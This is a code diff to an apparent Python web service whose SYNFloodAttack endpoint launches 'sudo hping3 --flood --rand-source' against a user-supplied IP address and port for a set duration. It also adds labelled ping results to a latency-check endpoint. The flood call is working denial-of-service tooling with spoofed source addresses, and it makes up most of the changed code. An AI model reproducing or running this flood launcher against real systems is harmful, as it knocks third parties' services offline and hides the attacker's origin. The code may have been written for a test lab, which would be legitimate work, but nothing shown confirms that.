@@ -14,34 +14,19 @@ def SYNFloodAttack():
     attackType = data["attackType"]
     duration = int(data["duration"])
 
-    # Get the current time
-    start_time = time.time()
-
-    # Calculate the end time by adding the desired duration to the start time
-    end_time = start_time + duration
-
-    dosCommand = subprocess.Popen(['sudo', 'hping3', attackType, '-d', packetSize, '--flood', '--rand-source', '-p', portNumber, ipAddress])
-    # pingCommand = subprocess.Popen(['ping', '-i', '5', '-O', ipAddress], stdout=subprocess.PIPE)
-
-    # while time.time() < end_time:
-    #     output = pingCommand.stdout.readline()
-    #     if pingCommand.poll() is not None:
-    #         break
-    #     if output:
-    #         print('hello ', output.strip())
-
+    dosCommand = subprocess.Popen(
+        ['sudo', 'hping3', attackType, '-d', packetSize, '--flood', '--rand-source', '-p', portNumber, ipAddress],
+        stdout=subprocess.PIPE,
+        text=True)
     time.sleep(duration) # carry out attack for specified duration
 
     try:
         dosCommand.send_signal(signal.SIGINT) # Send CTRL+c to kill the child process
-        # pingCommand.send_signal(signal.SIGINT) # Send CTRL+c to kill the child process
     except subprocess.TimeoutExpired:
         print('Timeout occured')
     
     dosCommand.kill()
-    # pingCommand.kill()
-
-    return "DoS Complete"
+    return ""
 
 @dosAttack.post("/latency")
 def checkLatency():
@@ -54,4 +39,7 @@ def checkLatency():
     lines = output.splitlines()
     line = lines[1]
 
-    return line
+    if "time" in line:
+        return '[PING SUCCESS] ' + line
+    else:
+        return '[PING FAILED] ' + line
